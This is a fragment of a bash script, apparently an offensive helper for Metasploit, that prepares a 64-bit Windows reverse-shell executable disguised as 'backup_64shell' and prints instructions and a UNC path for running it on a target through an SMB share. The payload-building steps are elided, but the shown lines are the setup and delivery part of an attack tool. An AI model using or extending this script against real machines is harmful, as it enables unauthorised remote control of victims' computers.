...
if [ $# -eq 0 ]; then
  echo "Usage:"
  echo "bash MSF_PS_EXE_windows_64.sh [web server port] [reverse port]"
  echo "bash MSF_PS_EXE_windows_64.sh [web server port] [reverse port]" | clip
  exit 1
fi
IP=$( IP_No_Clip );                      
New_IP=$( echo -n $IP );  
...
echo -e "${GREEN}Ready...Execute backup_64shell_$2.exe from target through smb_server, please :)";
echo -e "${CYAN}\\\\\\$New_IP\\\brwn\\\backup_64shell_$2.exe\n";
echo "\\\\$New_IP\\brwn\\backup_64shell_$2.exe" | clip;
